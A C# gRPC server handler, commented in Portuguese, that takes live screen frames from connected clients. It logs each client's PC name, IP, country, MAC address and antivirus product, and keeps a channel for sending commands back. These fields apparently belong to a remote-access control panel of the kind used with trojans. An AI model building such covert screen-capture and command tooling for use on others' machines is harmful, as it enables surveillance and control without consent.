using System;
using System.Threading.Tasks;
using Grpc.Core;
using ExemploGrpc;

public class ScreenServiceImpl : ScreenService.ScreenServiceBase
{
    public override async Task StreamScreen(
        IAsyncStreamReader<ScreenFrame> requestStream,
        IServerStreamWriter<ScreenCommand> responseStream,
        ServerCallContext context)
    {
        var peer = context.Peer; // ex: "ipv4:127.0.0.1:12345"
        string ipFromPeer = peer;

        var parts = peer.Split(':');
        if (parts.Length >= 3)
            ipFromPeer = parts[1];

        ClientSession? session = null;

        try
        {
            while (await requestStream.MoveNext(context.CancellationToken))
            {
                var frame = requestStream.Current;

                if (session == null)
                {
                    var ipFinal = string.IsNullOrWhiteSpace(frame.Ip) ? ipFromPeer : frame.Ip;

                    session = ClientManager.Instance.GetOrCreateClient(
                        frame.PcName,
                        ipFinal,
                        frame.Country,
                        frame.Mac,
                        frame.Antivirus
                    );

                    // guarda “canal” pra mandar comandos pro cliente
                    // Usa fire-and-forget para não bloquear o thread que recebe frames
                    session.SendCommandAsync = cmd =>
                    {
                        _ = System.Threading.Tasks.Task.Run(async () =>
                        {
                            try
                            {
                                await responseStream.WriteAsync(cmd).ConfigureAwait(false);
                            }
                            catch { /* ignora erros de escrita para não quebrar o stream */ }
                        });
                        return System.Threading.Tasks.Task.CompletedTask;
                    };
                }

                // ping
                if (frame.Timestamp > 0)
                {
                    var nowMs = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds();
                    var diff = nowMs - frame.Timestamp;
                    if (diff >= 0 && diff < int.MaxValue)
                        session.PingMs = (int)diff;
                }

                // resolução da tela + frame
                session.ScreenWidth  = frame.Width;
                session.ScreenHeight = frame.Height;
                session.MonitorIndex = frame.MonitorIndex;
                session.MonitorsCount = frame.MonitorsCount;
                session.UpdateFrame(frame.ImageData.ToByteArray());
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Erro no stream: {ex.Message}");
        }
        finally
        {
            if (session != null)
            {
                session.SendCommandAsync = null;
                ClientManager.Instance.RemoveClient(session.Id);
                Console.WriteLine($"Cliente desconectado: {session.PcName} / {session.Ip}");
            }
        }
    }
}
